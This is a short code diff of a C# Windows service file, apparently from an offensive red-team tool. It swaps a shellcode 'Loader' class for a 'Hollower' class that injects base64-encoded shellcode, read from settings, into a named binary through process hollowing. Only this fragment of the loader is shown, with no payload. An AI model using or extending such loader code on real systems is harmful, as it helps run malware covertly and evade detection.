+++ TikiService/TikiService.cs
@@ -21,7 +21,7 @@ namespace TikiService
                 string binary = settings["Binary"];
                 byte[] shellcode = Convert.FromBase64String(settings["Shellcode"]);
 
-                var ldr = new Loader();
+                var ldr = new Hollower();
                 ldr.LoadWithoutPid(binary, shellcode);
             }
             catch
